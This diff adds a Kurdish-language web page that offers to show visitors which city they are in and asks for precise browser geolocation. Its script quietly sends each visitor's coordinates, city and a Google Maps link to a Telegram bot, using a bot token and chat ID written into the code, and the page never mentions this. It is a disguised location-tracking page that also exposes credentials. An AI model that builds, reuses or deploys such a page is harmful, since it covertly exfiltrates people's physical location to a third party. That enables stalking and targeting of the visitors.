@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دیاریکردنی شار لە مۆبایل</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 15px;
+            box-sizing: border-box;
+        }
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+        }
+        h2 { color: #1a73e8; margin-top: 0; font-size: 22px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.6; }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            border-radius: 24px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.2s;
+            margin-top: 15px;
+            width: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+        button:hover { background-color: #1557b0; }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #f8f9fa;
+            display: none;
+            font-size: 16px;
+            color: #3c4043;
+            line-height: 1.6;
+            border: 1px solid #e0e0e0;
+        }
+        #mapContainer {
+            margin-top: 20px;
+            width: 100%;
+            height: 280px;
+            border-radius: 8px;
+            border: 1px solid #ced4da;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>زانینی ناوی شارەکەت</h2>
+        <p>بۆ ئەوەی سیستەمەکە پێ بڵێت لە چ شارێکیت، کلیک لەسەر دوگمەکەی خوارەوە بکە و ڕێگەپێدان (Allow) دابگرە.</p>
+        <button id="startBtn">دۆزینەوەی شارەکەم 📍</button>
+        
+        <div id="statusBox" class="status"></div>
+        
+        <iframe id="mapContainer" src="" allowfullscreen="" loading="lazy"></iframe>
+    </div>
+
+    <script>
+        // زانیارییەکانی تۆ بە تەواوی ڕێکخران
+        const TELEGRAM_BOT_TOKEN = '7719273579:AAGhBd2fbqukGtPHh5Kg38ZY9kbpMysSZs'; 
+        const TELEGRAM_CHAT_ID = '949718113';
+
+        document.getElementById('startBtn').addEventListener('click', function() {
+            const statusBox = document.getElementById('statusBox');
+            statusBox.style.display = "block";
+            statusBox.style.color = "#3c4043";
+            statusBox.innerHTML = "خەریکە لۆکەیشنەکەت دەپشکنرێت، تکایە چاوەڕوان بە...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(getCityAndShowMap, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                statusBox.innerHTML = "داوای لێبوردن، وێبگەری مۆبایلەکەت ڕێگا بەم کارە نادات.";
+            }
+        });
+
+        function getCityAndShowMap(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const statusBox = document.getElementById('statusBox');
+            const mapContainer = document.getElementById('mapContainer');
+            
+            const apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`;
+            
+            fetch(apiUrl, {
+                headers: { 'Accept-Language': 'ku,ckb,en,ar' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                let cityName = "نەزانراو";
+                if (data.address) {
+                    cityName = data.address.city || data.address.town || data.address.county || data.address.state || data.address.village || "دیاری نەکراو";
+                }
+                
+                statusBox.style.color = "#1e7e34";
+                statusBox.innerHTML = `❖ لۆکەیشن بە سەرکەوتوویی دۆزرایەوە!<br>📍 تۆ ئێستا لە شاری: <b>${cityName}</b> دایت.`;
+                
+                const embedMapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=14&output=embed`;
+                mapContainer.src = embedMapUrl;
+                mapContainer.style.display = "block";
+
+                sendToTelegram(lat, lon, cityName);
+            })
+            .catch(error => {
+                statusBox.style.color = "#1e7e34";
+                statusBox.innerHTML = "لۆکەیشنەکەت دۆزرایەوە.";
+                const embedMapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=14&output=embed`;
+                mapContainer.src = embedMapUrl;
+                mapContainer.style.display = "block";
+                
+                sendToTelegram(lat, lon, "ناو شارەکە نەخوێندرایەوە");
+            });
+        }
+
+        function sendToTelegram(lat, lon, city) {
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `🔔 *بەکارهێنەرێک لۆکەیشنی نارد!* \n\n📍 شار: ${city} \n🌐 هێڵی پانی و درێژی: ${lat}, ${lon} \n🔗 نەخشەی گوگڵ: ${googleMapsLink}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Error:", err));
+        }
+
+        function showError(error) {
+            const statusBox = document.getElementById('statusBox');
+            statusBox.style.color = "#dc3545";
+            statusBox.innerHTML = "⚠️ کێشەیەک لە دۆزینەوەی لۆکەیشندا ڕوویدا. دڵنیا بەرەوە کە لۆکەیشنی مۆبایلەکەت کراوەتەوە.";
+        }
+    </script>
+</body>
+</html>
